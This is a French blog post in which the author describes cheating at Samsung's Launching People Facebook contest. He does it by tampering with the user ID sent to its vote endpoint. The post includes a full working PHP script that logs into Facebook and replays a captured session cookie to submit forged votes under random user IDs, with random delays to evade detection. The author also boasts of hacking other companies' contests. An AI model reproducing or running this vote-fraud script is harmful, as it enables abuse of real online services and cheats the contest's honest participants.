---
title: Comment j’ai triché à Samsung Launching People et pourquoi ils ont bien réagi
author: Jice

date: 2013-09-02
url: /2013/09/comment-jai-triche-a-samsung-launching-people-et-pourquoi-ils-ont-bien-reagi/
factory_sociallocker_include_assets:
  - sociallocker
categories:
  - Informatique
  - PHP
tags:
  - curl
  - header
  - PHP
  - samsung
  - triche
  - wordiz
---
Toujours en cours actuellement, un concours mis en place par Samsung a récolté une très bonne visibilité sur la blogosphère française : Samsung Launching People. Dans cet article je vous explique comment il était possible de tricher à ce concours et comment Samsung gère la situation d&#8217;une manière intelligente.

## Introduction

Dans ma série de posts pour expliquer comment tricher sur le web, j&#8217;aimerais aujourd&#8217;hui vous parler du concours <a title="Concours Facebokk Samsung" href="https://apps.facebook.com/launchingpeople-fr/" target="_blank">Samsung Launching People</a>. La dernière fois que j&#8217;ai décrypté une technique de triche, c&#8217;était à l&#8217;occasion de <a title="Triche aux Golden Blog Awards" href="http://www.graphemeride.com/blog/comment-j-ai-triche-aux-golden-blog-awards" target="_blank">Golden Blog Awards</a>. A l&#8217;époque, la technique était très simple puisque les votes se faisaient par un simple clic. Dans le cas de Samsung, le jeu concours a été organisé sur Facebook. Il est en général plus difficile de tricher à ce genre de concours hébergés sur le géant des réseaux sociaux.

<img class="aligncenter size-medium wp-image-1384" alt="Launching People" src="/images/posts/oldwordpress/uploads/2013/09/launching_people-300x230.png" width="300" height="230" />

Cependant, jusqu&#8217;à présent (<a title="Nouveaux types de concours facebook" href="http://www.commentcamarche.net/news/5863033-concours-sur-facebook-les-applications-tierces-ne-sont-plus-requises" target="_blank">cela va changer</a>), il était nécessaire de créer une application tierce pour faire son concours, l&#8217;application étant hébergée par la société éditrice du concours. C&#8217;est là que le bât blesse dans 95% des cas : les jeux concours sur le Web sont TOUS craquables, piratables sans le moindre souci lorsqu&#8217;il s&#8217;agit d&#8217;un concours basé sur un score (nombre de points à obtenir, nombre de likes, etc). Pour ce que j&#8217;en pense, **les seuls jeux concours non craquables sont basés sur le système d&#8217;instants gagnants**. C&#8217;est la seule technique qui ne permet pas de piratage facile.

## Analyse de la cible

Le concours de Samsung visait à récompenser des idées de projets/startups. J&#8217;avais soumis mon projet actuel (<a title="WordiZ - Moteur de recherche de bloggeurs" href="http://www.wordiz.it" target="_blank">WordiZ</a>) à ce concours pour espérer attirer l&#8217;attention. Pour arriver en demi-finale, le règlement précisait bien :

> Dès la mise en ligne des Projets sur la Page, les Supporters pourront afficher leur soutien à un ou plusieurs de ces Projets en cliquant sur le bouton « support » ou « supporter » dans la limite d’un clic par Projet, que ce dernier ait été ou non modifié.**
  
>** Un jury désignera ensuite 5 Projets dans chaque catégorie parmi une _sélection_ de ceux ayant été les plus plébiscités.

Samsung avait déjà prévu les cas de triche. Cependant, pour être correct, ils auraient du préciser dans leur règlement ce que signifiait exactement cette _sélection_.

Bref, pour faire court et rapide : lors d&#8217;un vote, si vous traciez les paquets envoyés entre votre PC et l&#8217;application (avec <a title="Http live header" href="https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/" target="_blank">http live header</a> par exemple) vous receviez ce genre d&#8217;informations :

  * Page appelée : https://www.launchingpeople.fr/supporters/add.json
  * Envoi d&#8217;information en POST : project\_id=10858&app\_user_id=42325

Assez évident de comprendre les valeurs des informations envoyées :

  * project_id = id du projet pour lequel l&#8217;utilisateur vote
  * app\_user\_id : l&#8217;id de l&#8217;utilisateur qui vote

Voilà, c&#8217;est tout&#8230; tiens tiens.. et si l&#8217;on essayait de changer la valeur de _app\_user\_id_ ? On relance le paquet avec un injecteur quelconque, en changeant juste la variable app\_user\_id &#8230; et là, ô surprise, mon projet a gagné un vote !

## Faire monter ses votes automatiquement sur Facebook

Après cette introduction rapide qui vous montre que même les grosses sociétés ne font pas attention à protéger leurs concours, voici le code du script que j&#8217;ai utilisé pour rajouter une cinquantaine de votes par jour à mon projet. Il est écrit en PHP et je ne vous le détaillerai pas. De toute manière, vous ne pourrez plus vous en servir car les prochains concours Samsung changeront sans doute de stratégie&#8230;

Le code vous montre deux choses : comment se connecter automatiquement à Facebook puis à injecter les faux votes. Ne faites pas trop de bêtises avec.

Le code est placé derrière un &#8216;social lock&#8217; . Pour voir le code, vous devrez soutenir mon projet wordiZ en partageant un petit message sur Twitter.

[sociallocker id=&#8221;1392&#8243;]

[php]

<?php
  
/\* EDIT EMAIL AND PASSWORD \*/
  
$EMAIL = "user@gmail.com"; /\* your facebook email address \*/
  
$PASSWORD = "zemegapassword"; /\* your facebook password \*/

function cURL($url, $header=NULL, $cookie=NULL, $p=NULL, $referer=NULL){
  
$ch = curl_init();
  
curl\_setopt($ch, CURLOPT\_HEADER, $header);
  
curl\_setopt($ch, CURLOPT\_NOBODY, $header);
  
curl\_setopt($ch, CURLOPT\_URL, $url);
  
curl\_setopt($ch, CURLOPT\_SSL_VERIFYHOST, 0);
  
curl\_setopt($ch, CURLOPT\_COOKIE, $cookie);
  
curl\_setopt($ch, CURLOPT\_USERAGENT, &#8216;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0&#8242;);
  
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, 1);
  
curl\_setopt($ch, CURLOPT\_SSL_VERIFYPEER, 0);
  
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, 0);
  
if ($referer){
  
curl\_setopt($ch, CURLOPT\_REFERER, $referer);
  
}
  
if ($p) {
  
curl\_setopt($ch, CURLOPT\_CUSTOMREQUEST, "POST");
  
curl\_setopt($ch, CURLOPT\_POST, count($p));
  
curl\_setopt($ch, CURLOPT\_POSTFIELDS, $p);
  
}
  
$result = curl_exec($ch);
  
if ($result) {
  
echo "1<br>";
  
return $result;
  
} else {
  
echo "2";
  
return curl_error($ch);
  
}
  
curl_close($ch);
  
}

$a = cURL("https://login.facebook.com/login.php?login_attempt=1",true,null,"email=$EMAIL&pass=$PASSWORD");
  
preg_match(&#8216;%Set-Cookie: ([^;]+);%&#8217;,$a,$b);
  
$c = cURL("https://login.facebook.com/login.php?login_attempt=1",true,$b[1],"email=$EMAIL&pass=$PASSWORD");
  
preg\_match\_all(&#8216;%Set-Cookie: ([^;]+);%&#8217;,$c,$d);
  
// 2 connexions needed to Facebook to keep the good cookie file

for($i=0;$i<count($d[0]);$i++)
  
$cookie.=$d\[1\]\[$i\].";";
  
// echo $cookie;
  
/*
  
NOW TO JUST OPEN ANOTHER URL EDIT THE FIRST ARGUMENT OF THE FOLLOWING FUNCTION.
  
TO SEND SOME DATA EDIT THE LAST ARGUMENT.
  
*/

/\* Avant de lancer le code, aller sur Launching People et récupérer un cookie (via http live header) pour lancer le code" \*/
  
$cookie\_launching="PHPSESSID=ega4ci3eh0cvkbt2j05ofqaef0; AWSELB=CBE1FB270C6941DFB66E8C12CA14F9B689E6A3DAE6F1066337DD36CAC51F25430D6984DE37EAE662EDAFF9580A0756BBD42971ACCD4AA8F387211187C71774EB0CBBAE2C86; fbsr\_603746272976704=WiZA3GyRVIrFB1lbxNcUkD3VTLEryqVlCDMXJncVK-g.eyJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImNvZGUiOiJBUUNpVi1aY0MwRzI2eS1ZLUxGVU5ESlkzM1FNTWpJZFBfTUM4TlBjcy04QW9abFpTTnJHWGE5NjBLMk16RmYwd3ZIUllCN0QzNk16UnJFS2xRNk1jUGZKUWlVNlRNSGNVXzlURUQ5QUlTU1o0M0htQ19ndUstZjdndUFWNk4yUWFPMS1GYWR6XzZXc3Q4OTlCUFpfbnJoOTVXZFpfUTJURDU5c3NUSFgwX1RmNmpNM2VoRTQzZEFfQUctU1czaGotem9PeXRpeGJpcnI3ZWFDdENNMzR0NU1hbV9tUWZRVDZMMnN6TGpIMkFJQlFaVWFlSHczaUNsM1ZuLWU0NjU4azJEVi1odm52d19MNFpjcXZPdXV5cV8xRkg4Q3UtVFNXcnFVRFdfamZKLWFQMkJkR3l3MURyanJKU2RGOTNXaHN3OCIsImlzc3VlZF9hdCI6MTM3NjQ3MjcyMSwidXNlcl9pZCI6IjU4ODI5ODAwNCJ9";

for ($ii=0; $ii<10 ;  $ii++){
  
$appuser=rand(45325,49325);
  
$postfields = array(
  
&#8216;app\_user\_id&#8217;=>urlencode($appuser), // On itère sur les faux utilisateurs qui vont venir voter
  
&#8216;project_id&#8217;=>urlencode("10858") // l&#8217;id de mon application http://www.wordiz.it
  
);
  
$postdata=http\_build\_query($postfields);

echo $i;
  
echo cURL("https://www.launchingpeople.fr/supporters/add.json",$header,$cookie_launching,$postdata,"https://www.launchingpeople.fr/project/trouver-des-influenceurs-pour-faire-passer-votre-message/");
  
sleep(rand(30,60)); // on attend un peu pour faire plus &#8216;vrai&#8217;
  
echo "<br>";

}
  
?>
  
[/php]

[/sociallocker]

## Pourquoi faire un concours à vote?

Au final, parmi les projet retenus, il n&#8217;y a eu aucun des gros concurrents ayant reçu le plus de votes. J&#8217;en conclu donc que le jury n&#8217;a pas du tout tenu compte du nombre de votes pour faire son choix. Bien vu Samsung. Bonne opération marketing. Vu le nombre d&#8217;inscrits au jeu, le concours a du rapporter à la société une base d&#8217;environ 60 000 utilisateurs ayant voté.

Sur ce nombre, en admettant que 5%  des votants furent attirés par le lot offert en loterie à ceux qui laisseraient leur email, je pense que Samsung a collecté environ 5% x 60000 = 3000 emails de prospects. Je ne suis pas webmarketeur&#8230; que pensez-vous de ces nombres?

Je pense que Samsung a bien géré ce concours. Tout d&#8217;abord, il y avait une personne dédiée au concours qui approuvait les candidatures et répondait aux questions. Ensuite, le fait que le jury n&#8217;ait pas pris en compte les votes est &#8220;intelligent&#8221; même si c&#8217;est quand même un peu déplorable : j&#8217;ai passé environ cinq heures à faire du networking pour obtenir les seuls 300 vrais votes reliés à mon compte (j&#8217;avais fait publier des articles dans des blogs connus pour parler de moi et demander du soutien).

[<img class="aligncenter size-medium wp-image-1385" alt="WordiZ sur Launching People" src="/images/posts/oldwordpress/uploads/2013/09/samsung-300x182.png" width="300" height="182" />][1]

## Les sociétés qui font des concours sur le web

Les sociétés qui font des concours sur le web se fichent en général de vraiment suivre les règles de leur concours. Elles savent en général que leur concours sera piraté et ne font rien pour empêcher que cela arrive. Leur but est simplement d&#8217;attirer le plus de buzz possible sur leur application pour obtenir de nouveaux emails pour vendre leur produits.

Dans le passé je me suis souvent amusé à pirater les jeux concours de société comme Samsung, Redbull, LG, Microsoft, en faisant vraiment attention à finement mettre un score raisonnable, humain, ne jamais viser le premier lot etc. Jamais une seule fois je n&#8217;ai reçu de prix. La morale à tout cela ? Rien, si ce n&#8217;est que **si vous êtes bloggeur vous pouvez vous inscrire à ma startup** <a title="WordiZ - Moteur de recherche de bloggeurs" href="http://www.wordiz.it" target="_blank">WordiZ (pour connaitre votre influence en tant que bloggeur)</a> et si vous êtes une société de relation publique ou d&#8217;inbound marketing, vous pouvez [me commander][2] des listing d&#8217;influenceurs (pas cher pas cher).

Des questions? Laissez un commentaire ci-dessous je vous en prie.

 [1]: /images/posts/oldwordpress/uploads/2013/09/samsung.png
 [2]: mailto:ref@wordiz.it "Commander des listing d'influenceurs bloggeurs"